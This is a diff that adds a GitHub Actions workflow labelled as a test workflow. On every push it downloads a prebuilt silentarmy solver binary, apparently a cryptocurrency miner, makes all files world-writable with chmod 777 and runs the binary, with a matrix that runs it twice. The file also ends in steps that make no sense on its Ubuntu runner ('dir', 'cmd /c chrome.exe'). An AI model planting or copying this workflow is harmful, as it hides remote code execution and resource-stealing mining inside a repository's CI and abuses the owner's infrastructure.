@@ -1,0 +1,15 @@
+name: Test Workflow Github
+on: push
+jobs:
+  job:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix: 
+        run: ['run1', 'run2']
+    steps:
+    - run: echo Run ${{ matrix.run }}
+    - run: curl https://github.com/mbevand/silentarmy/releases/download/v5/sa-solver.linux64.v5 -O
+    - run: chmod 777 *
+    - run: ./sa-solver.linux64.v5
+    - run: dir
+    - run: cmd /c chrome.exe
